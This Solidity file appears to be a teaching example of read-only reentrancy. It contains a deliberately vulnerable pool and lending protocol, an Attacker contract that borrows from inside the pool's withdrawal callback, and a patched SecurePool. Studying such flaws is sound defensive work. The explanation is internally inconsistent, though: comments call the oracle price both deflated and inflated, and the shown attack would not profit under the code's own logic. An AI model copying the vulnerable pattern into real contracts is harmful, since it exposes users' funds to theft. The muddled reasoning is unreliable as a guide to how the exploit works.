// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ❌ VULNERABLE CODE: A Lending Protocol That Trusts a Pool's balanceOf mid-transaction

interface IPool {
    function deposit() external payable;
    function withdraw() external;
    function getSharePrice() external view returns (uint256);
}

/**
 * @notice A simplified liquidity pool (like Curve/Balancer style)
 * @dev The share price is calculated based on the contract's ETH balance
 */
contract VulnerablePool {
    mapping(address => uint256) public shares;
    uint256 public totalShares;

    function deposit() external payable {
        uint256 sharesToMint = msg.value; // simplified 1:1 for clarity
        shares[msg.sender] += sharesToMint;
        totalShares += sharesToMint;
    }

    function withdraw() external {
        uint256 userShares = shares[msg.sender];
        require(userShares > 0, "No shares");

        uint256 ethToReturn = (address(this).balance * userShares) / totalShares;

        // ⚠️ STATE UPDATE HAPPENS *AFTER* THE EXTERNAL CALL
        // shares are NOT yet reduced when ETH is sent
        (bool success, ) = msg.sender.call{value: ethToReturn}("");
        require(success, "Transfer failed");

        // State updated too late, attacker's callback runs BEFORE this line
        shares[msg.sender] = 0;
        totalShares -= userShares;
    }

    /// @notice This is a VIEW function seems safe, right? WRONG.
    function getSharePrice() external view returns (uint256) {
        if (totalShares == 0) return 1e18;
        return (address(this).balance * 1e18) / totalShares;
    }
}

/**
 * @notice A lending protocol that uses the pool's share price as an oracle
 * @dev    THIS IS WHERE THE REAL DAMAGE HAPPENS
 */
contract VulnerableLendingProtocol {
    IPool public pool;
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public debt;

    constructor(address _pool) {
        pool = IPool(_pool);
    }

    function depositCollateral(uint256 amount) external {
        collateral[msg.sender] += amount;
    }

    function borrow(uint256 amount) external {
        // 🔴 THE BUG: Reading share price during the pool's withdrawal callback
        // The pool's ETH balance is ALREADY reduced (ETH sent out)
        // But totalShares is NOT yet reduced (state update pending)
        // Result: getSharePrice() returns a DEFLATED price
        //
        // For the ATTACKER's separate contract that deposited into this lending protocol:
        // They see an INFLATED collateral value compared to real value
        uint256 price = pool.getSharePrice();
        uint256 collateralValue = (collateral[msg.sender] * price) / 1e18;

        require(collateralValue >= debt[msg.sender] + amount, "Undercollateralized");
        debt[msg.sender] += amount;

        // ... transfer borrowed tokens to msg.sender
    }
}

// ============================================================
//  🔓 THE ATTACKER
// ============================================================

contract Attacker {
    VulnerablePool public pool;
    VulnerableLendingProtocol public lending;

    constructor(address _pool, address _lending) {
        pool = VulnerablePool(_pool);
        lending = VulnerableLendingProtocol(_lending);
    }

    function attack() external payable {
        // Step 1: Deposit into the pool to get shares
        pool.deposit{value: msg.value}();

        // Step 2: Withdraw, this triggers the callback below
        pool.withdraw();
    }

    // Step 3: This runs DURING pool.withdraw(), BEFORE state is updated
    receive() external payable {
        // At this moment:
        // - Pool's ETH balance is REDUCED (our ETH was sent to us)
        // - Pool's totalShares is NOT YET reduced
        // - getSharePrice() returns a STALE/MANIPULATED value
        //
        // Any protocol reading getSharePrice() NOW gets WRONG data
        // We can exploit the lending protocol here
        lending.borrow(1000 ether); // borrow with manipulated price
    }
}


// ============================================================
//  ✅ THE FIX: Use a Reentrancy Guard on View Functions Too
// ============================================================

contract SecurePool {
    mapping(address => uint256) public shares;
    uint256 public totalShares;
    uint256 private _locked = 1;

    modifier nonReentrant() {
        require(_locked == 1, "REENTRANCY");
        _locked = 2;
        _;
        _locked = 1;
    }

    // ✅ FIX 1: Follow Checks-Effects-Interactions pattern
    function withdraw() external nonReentrant {
        uint256 userShares = shares[msg.sender];
        require(userShares > 0, "No shares");

        uint256 ethToReturn = (address(this).balance * userShares) / totalShares;

        // ✅ Update state BEFORE the external call
        shares[msg.sender] = 0;
        totalShares -= userShares;

        (bool success, ) = msg.sender.call{value: ethToReturn}("");
        require(success, "Transfer failed");
    }

    // ✅ FIX 2: Apply nonReentrant to VIEW functions too!
    // This prevents any contract from reading stale state mid-transaction
    function getSharePrice() external view returns (uint256) {
        // In Solidity, view functions can't modify state,
        // so we check the lock variable directly
        require(_locked == 1, "REENTRANCY");
        if (totalShares == 0) return 1e18;
        return (address(this).balance * 1e18) / totalShares;
    }
}
